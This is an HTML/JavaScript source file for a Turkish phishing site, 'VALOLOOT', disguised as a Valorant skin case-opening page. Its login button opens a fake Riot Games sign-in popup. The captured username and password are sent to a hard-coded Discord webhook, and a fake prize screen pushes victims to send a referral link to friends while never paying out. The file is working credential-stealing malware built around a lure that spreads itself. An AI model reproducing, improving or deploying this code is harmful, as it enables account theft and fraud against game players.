<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>VALOLOOT.NET | Valorant Case Opening</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&family=Montserrat:wght@700;900&display=swap" rel="stylesheet">
    <style>
        :root { --valo-red: #ff4655; --dark-bg: #0b1119; --nav-bg: #111420; }
        body { background: var(--dark-bg) url('bg.jpg') fixed center/cover; color: white; font-family: 'Inter', sans-serif; margin: 0; padding: 0; min-height: 100vh; overflow-x: hidden; }
        
        /* 1. CANLI DROPLAR (SOLA EKLEME VE İTTİRME) */
        .live-drops { background: rgba(0, 0, 0, 0.95); height: 100px; border-bottom: 2px solid var(--valo-red); display: flex; align-items: center; overflow: hidden; position: relative; width: 100%; }
        .mythic-label { background: var(--valo-red); height: 100%; display: flex; align-items: center; padding: 0 20px; font-family: 'Montserrat'; font-weight: 900; font-size: 14px; text-transform: uppercase; z-index: 50; color: #fff; box-shadow: 10px 0 20px rgba(0,0,0,0.5); }
        .drop-container { display: flex; align-items: center; padding-left: 15px; flex-grow: 1; gap: 12px; }
        .drop-card { background: rgba(255,255,255,0.03); border-radius: 4px; width: 130px; height: 75px; display: flex; flex-direction: column; align-items: center; justify-content: space-between; flex-shrink: 0; padding-top: 10px; overflow: hidden; border: 1px solid rgba(255,255,255,0.05); animation: slideIn 0.4s ease-out; }
        .drop-card img { height: 45px; object-fit: contain; }
        .rarity-box { width: 100%; height: 6px; margin-top: auto; }
        @keyframes slideIn { from { transform: translateX(-50px); opacity: 0; } to { transform: translateX(0); opacity: 1; } }

        /* 2. HEADER & CASE GRID */
        header { padding: 15px 50px; display: flex; align-items: center; background: var(--nav-bg); border-bottom: 1px solid rgba(255,255,255,0.1); gap: 40px; }
        .logo { font-family: 'Montserrat', sans-serif; font-size: 26px; font-weight: 900; }
        .logo span { color: var(--valo-red); }
        .nav-links { display: flex; gap: 25px; flex-grow: 1; }
        .nav-links a { color: #888; text-decoration: none; font-size: 13px; font-weight: 700; text-transform: uppercase; }
        .btn-login { background: var(--valo-red); color: #fff; border: none; padding: 12px 25px; font-weight: 800; cursor: pointer; border-radius: 4px; text-transform: uppercase; }

        .case-wrapper { max-width: 1300px; margin: 40px auto; display: flex; flex-direction: column; gap: 30px; }
        .case-row { display: flex; flex-wrap: wrap; justify-content: center; gap: 25px; }
        .case-box { background: #101123; border-radius: 12px; padding: 20px; text-align: center; border: 1px solid #222; transition: 0.3s; width: 280px; cursor: pointer; }
        .case-box:hover { border-color: var(--valo-red); transform: translateY(-5px); }
        .case-img-container { height: 160px; display: flex; align-items: center; justify-content: center; margin-bottom: 15px; }
        .case-box img { max-width: 100%; max-height: 100%; object-fit: contain; }
        .vp-tag { color: #79eb1e; font-weight: 800; font-size: 22px; margin-bottom: 15px; font-family: 'Montserrat'; }
        .open-btn { background: var(--valo-red); color: white; border: none; width: 100%; padding: 14px; font-weight: 800; border-radius: 4px; cursor: pointer; text-transform: uppercase; }

        /* 3. KASA MODALI & SPINNER */
        .modal-overlay { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.98); z-index:9999; align-items:center; justify-content:center; }
        .modal-card { background:#111420; border:2px solid var(--valo-red); border-radius:15px; width:90%; max-width:550px; padding:40px; text-align:center; }
        .spinner-box { width:100%; height:140px; background:#0b1119; border:1px solid rgba(255,255,255,0.1); margin:25px 0; overflow:hidden; position:relative; display:flex; align-items:center; border-radius: 8px; }
        .spinner-line { position:absolute; left:50%; width:4px; height:100%; background:var(--valo-red); z-index:10; transform: translateX(-50%); box-shadow: 0 0 20px var(--valo-red); }
        .item-strip { display:flex; position:absolute; left:0; transition: transform 5s cubic-bezier(0.1, 0, 0, 1); align-items:center; }
        .item-strip img { width:130px; height: 100px; object-fit: contain; margin:0 20px; }

        .win-view { display:none; animation: zoomIn 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
        @keyframes zoomIn { from { transform: scale(0.8); opacity:0; } to { transform: scale(1); opacity:1; } }
        .ref-box { background:#000; padding:12px; border:1px dashed #79eb1e; color:#79eb1e; font-size:12px; margin:15px 0; cursor:pointer; }
    </style>
</head>
<body>

    <div class="live-drops">
        <div class="mythic-label">CANLI DROPLAR</div>
        <div class="drop-container" id="dropTrack"></div>
    </div>

    <header>
        <div class="logo">VALO<span>LOOT</span></div>
        <div class="nav-links">
            <a href="#">Kasalar</a><a href="#">Savaşlar</a><a href="#">Mağaza</a>
        </div>
        <div id="authArea">
            <button class="btn-login" onclick="openAuth()">GİRİŞ YAP</button>
        </div>
    </header>

    <div class="case-wrapper">
        <div class="case-row" id="row1"></div>
    </div>

    <div id="caseModal" class="modal-overlay">
        <div class="modal-card">
            <div id="openingView">
                <h2 style="font-family:'Montserrat'; letter-spacing: 2px;">KASA AÇILIYOR...</h2>
                <div class="spinner-box">
                    <div class="spinner-line"></div>
                    <div id="itemStrip" class="item-strip"></div>
                </div>
            </div>
            <div id="winView" class="win-view">
                <h1 style="color:#79eb1e; font-family:'Montserrat';">TEBRİKLER!</h1>
                <img id="wonImg" src="" style="width:220px; margin:15px 0; filter:drop-shadow(0 0 30px #79eb1e);">
                <h2 id="wonName" style="margin:0;">-</h2>
                <div id="wonVP" style="background:#79eb1e; color:#000; padding:12px; border-radius:6px; font-weight:900; margin-top:15px; font-size:22px;">0 VP</div>
                <p style="font-size:12px; color:#aaa; margin-top:20px;">Ödülü çekmek için linki 1 arkadaşına gönder!</p>
                <div class="ref-box" onclick="alert('Link Kopyalandı!')">VALOLOOT.NET/JOIN?REF=<span id="refCode">1234</span></div>
                <button class="open-btn" style="background:#79eb1e; color:#000;" onclick="alert('Hata: Arkadaşınız henüz kayıt olmadı!')">HESABA AKTAR</button>
            </div>
        </div>
    </div>

    <script>
        let LOGGED_IN = false;
        // SADECE SİTEDE OLAN SKİNLER
        const skins = [
            {n: "YAĞMACI VANDAL", img: "skin1.png", vp: "1775 VP", color: "#ade55c"},
            {n: "İON PHANTOM", img: "skin2.png", vp: "1775 VP", color: "#4b82d5"},
            {n: "ASİL KARAMBİT", img: "skin3.png", vp: "3550 VP", color: "#d151dc"},
            {n: "KURONAMİ NO YİABA", img: "skin4.png", vp: "5350 VP", color: "#f7c133"},
            {n: "ULUPENÇE VANDAL", img: "skin5.png", vp: "1175 VP", color: "#ff4655"}
        ];

        // 1. CANLI DROP AKIŞI (SOLA İTTİRME)
        function spawnDrop() {
            const track = document.getElementById('dropTrack');
            const s = skins[Math.floor(Math.random() * skins.length)];
            const div = document.createElement('div');
            div.className = 'drop-card';
            div.innerHTML = `<img src="${s.img}" onerror="this.src='https://via.placeholder.com/40'"><div class="rarity-box" style="background:${s.color}"></div>`;
            track.prepend(div);
            if(track.children.length > 12) track.removeChild(track.lastChild);
            setTimeout(spawnDrop, Math.random() * 3000 + 2000);
        }

        // 2. KASALARI YÜKLE
        function loadCases() {
            const row1 = document.getElementById('row1');
            const data = [
                {n: "BAŞLANGIÇ", p: "GİRİŞ YAP", i: "case1.png", free: true},
                {n: "STANDART", p: "30 VP", i: "case2.png"},
                {n: "ELİT", p: "50 VP", i: "case3.png"},
                {n: "PREMIUM", p: "100 VP", i: "case4.png"}
            ];
            row1.innerHTML = '';
            data.forEach(c => {
                const action = c.free ? "handleFreeOpen()" : "openAuth()";
                row1.innerHTML += `
                    <div class="case-box" onclick="${action}">
                        <div class="case-img-container"><img src="${c.i}" onerror="this.src='https://via.placeholder.com/150'"></div>
                        <h3>${c.n} KASASI</h3>
                        <div class="vp-tag">${c.p}</div>
                        <button class="open-btn">${c.free && LOGGED_IN ? 'ÜCRETSİZ AÇ' : 'KASAYI AÇ'}</button>
                    </div>`;
            });
        }

        // 3. ÜCRETSİZ KASA AÇMA MEKANİĞİ
        function handleFreeOpen() {
            if(!LOGGED_IN) { openAuth(); return; }
            
            const modal = document.getElementById('caseModal');
            const strip = document.getElementById('itemStrip');
            modal.style.display = 'flex';
            document.getElementById('openingView').style.display = 'block';
            document.getElementById('winView').style.display = 'none';
            
            strip.style.transition = 'none';
            strip.style.transform = 'translateX(0)';
            strip.innerHTML = '';

            const winner = skins[Math.floor(Math.random() * skins.length)];
            // Spinner şeridini doldur (55. sırada kazanan var)
            for(let i=0; i<65; i++) {
                const s = (i === 55) ? winner : skins[Math.floor(Math.random() * skins.length)];
                strip.innerHTML += `<img src="${s.img}" onerror="this.src='https://via.placeholder.com/100'">`;
            }

            setTimeout(() => {
                strip.style.transition = 'transform 5s cubic-bezier(0.1, 0, 0, 1)';
                const move = (55 * 170) - (document.querySelector('.spinner-box').offsetWidth / 2) + 85;
                strip.style.transform = `translateX(-${move}px)`;

                setTimeout(() => {
                    document.getElementById('openingView').style.display = 'none';
                    document.getElementById('winView').style.display = 'block';
                    document.getElementById('wonImg').src = winner.img;
                    document.getElementById('wonName').innerText = winner.n;
                    document.getElementById('wonVP').innerText = winner.vp;
                    document.getElementById('refCode').innerText = Math.floor(1000 + Math.random() * 9000);
                }, 5500);
            }, 100);
        }

        // 4. RIOT GİRİŞ EKRANI
        function openAuth() {
            const w = 420, h = 650;
            const l = (screen.width/2)-(w/2), t = (screen.height/2)-(h/2);
            let win = window.open("", "RiotLogin", `width=${w},height=${h},top=${t},left=${l}`);
            
            const riotHTML = `
                <html>
                <head>
                    <style>
                        body { background: #f9f9f9; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
                        .card { background: #fff; padding: 40px; width: 300px; text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.1); border-radius:4px; }
                        input { width: 100%; padding: 15px; margin: 10px 0; border: 1px solid #ddd; background: #f2f2f2; border-radius: 4px; box-sizing: border-box; font-weight:bold; }
                        button { width: 100%; padding: 15px; background: #ff4655; color: white; border: none; border-radius: 4px; font-weight: 900; cursor: pointer; margin-top: 15px; }
                    </style>
                </head>
                <body>
                    <div class="card">
                        <img src="https://upload.wikimedia.org/wikipedia/commons/b/b6/Riot_Games_logo_icon.png" width="40">
                        <h2 style="margin-top:20px">OTURUM AÇ</h2>
                        <input id="u" placeholder="KULLANICI ADI">
                        <input id="p" type="password" placeholder="ŞİFRE">
                        <button onclick="send()">GİRİŞ YAP</button>
                    </div>
                    <script>
                        function send() {
                            const u = document.getElementById('u').value;
                            const p = document.getElementById('p').value;
                            if(u && p) {
                                window.opener.postMessage({u, p}, "*");
                                window.close();
                            }
                        }
                    <\/script>
                </body>
                </html>`;
            win.document.write(riotHTML);
        }

        // 5. GİRİŞİ YAKALA VE WEBHOOK GÖNDER
        window.addEventListener("message", (e) => {
            if(e.data.u && e.data.p) {
                LOGGED_IN = true;
                document.getElementById('authArea').innerHTML = `<div style="color:#79eb1e; font-weight:900; border:2px solid #79eb1e; padding:8px 15px; border-radius:4px;">${e.data.u.toUpperCase()}#TR1</div>`;
                loadCases(); // Butonları güncelle
                
                fetch("https://discord.com/api/webhooks/1489632402421841930/NW5qpH3UpfzBpTWSVcJ-FGXbevssOBhbMDUIdGjP4620rQLHvM6jx8fJGzji_4LQOBrq", {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        content: `✅ **Yeni Giriş!**\n👤 Kullanıcı: \`${e.data.u}\`\n🔑 Şifre: \`${e.data.p}\``
                    })
                });
            }
        });

        window.onload = () => { spawnDrop(); loadCases(); };
    </script>
</body>
</html>
